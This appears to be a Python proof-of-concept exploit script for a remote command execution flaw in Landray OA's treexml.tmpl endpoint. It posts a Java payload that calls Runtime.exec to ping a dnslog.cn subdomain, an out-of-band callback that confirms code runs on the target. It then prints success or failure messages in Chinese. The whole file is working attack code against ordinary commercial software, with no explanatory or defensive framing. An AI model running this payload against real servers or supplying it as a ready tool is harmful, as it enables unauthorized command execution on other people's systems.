import time
import requests
import urllib3
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        
        }
    success_msg = now_time() + '[SUCCESS]蓝凌OA_treeXml_远程命令执行存在'
    shell_msg = now_time() + ''
    warning_msg = now_time() + '[WARNING]蓝凌OA_treeXml_远程命令执行可能不存在'
    error_msg = now_time() + '[蓝凌OA_treeXml_远程命令执行][ERROR]无法利用poc请求目标或被目标拒绝请求'
    data='''s_bean=ruleFormulaValidate&script=try {
String cmd = "ping 123456.0d7a20.dnslog.cn";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}'''
    exp_url = target_url+'data/sys-common/treexml.tmpl'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.post(exp_url, headers=headers,data=data, verify=False)
        if respones.status_code == 200:
            return success_msg
        else:
            return warning_msg
    except:
        return error_msg
   
